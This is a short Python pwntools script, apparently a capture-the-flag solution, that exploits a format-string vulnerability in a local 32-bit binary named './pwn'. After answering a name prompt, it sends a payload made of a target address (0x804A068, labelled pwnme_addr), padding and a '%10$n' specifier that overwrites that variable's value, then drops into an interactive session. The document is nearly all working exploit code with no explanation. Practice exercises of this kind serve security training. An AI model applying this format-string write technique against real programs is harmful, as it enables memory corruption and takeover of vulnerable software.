from pwn import *
#context(os='linux',arch='amd64')
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

name = './pwn'

p = process(name)
elf = ELF(name)

if args.G:
    gdb.attach(p)

p.recvuntil("please tell me your name:\n")
p.sendline("sir")
p.recvuntil("leave your message please:\n")

pwnme_addr = 0x804A068;
payload = p32(pwnme_addr) + b"bbbb" + b"%10$n"
p.sendline(payload)
p.interactive()
